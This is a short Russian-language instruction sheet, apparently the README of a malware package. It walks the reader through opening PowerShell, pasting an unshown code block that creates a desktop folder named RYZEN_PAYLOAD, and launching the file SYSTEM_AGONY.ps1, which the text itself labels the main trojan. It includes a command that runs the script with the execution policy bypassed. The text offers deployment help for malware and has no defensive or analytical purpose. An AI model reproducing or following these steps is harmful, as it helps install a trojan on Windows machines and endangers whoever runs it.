[ШАГ 1] ОТКРЫТЬ POWERSHELL
-------------------------------------------------
Способ 1: Win + R -> ввести "powershell" -> Enter
Способ 2: Пуск -> найти "PowerShell" -> Enter


[ШАГ 2] ВСТАВИТЬ КОД
-------------------------------------------------
1. Скопируй код, который начинается с  = @'
2. Вставь в PowerShell (ПКМ -> Вставить)
3. Нажми Enter


[ШАГ 3] ЧТО ПОЯВИТСЯ
-------------------------------------------------
После выполнения на рабочем столе появится папка:
RYZEN_PAYLOAD

В ней будут файлы:
├── SYSTEM_AGONY.ps1    (главный троян)
├── SYSTEM_AGONY.zip    (архив с трояном)
└── README.txt          (эта инструкция)


[ШАГ 4] ЗАПУСК ТРОЯНА
-------------------------------------------------
Способ 1 (через PowerShell):
powershell -ExecutionPolicy Bypass -File "C:\Users\User\Desktop\RYZEN_PAYLOAD\SYSTEM_AGONY.ps1"

Способ 2 (через ZIP):
1. Распаковать SYSTEM_AGONY.zip
2. Запустить SYSTEM_AGONY.ps1
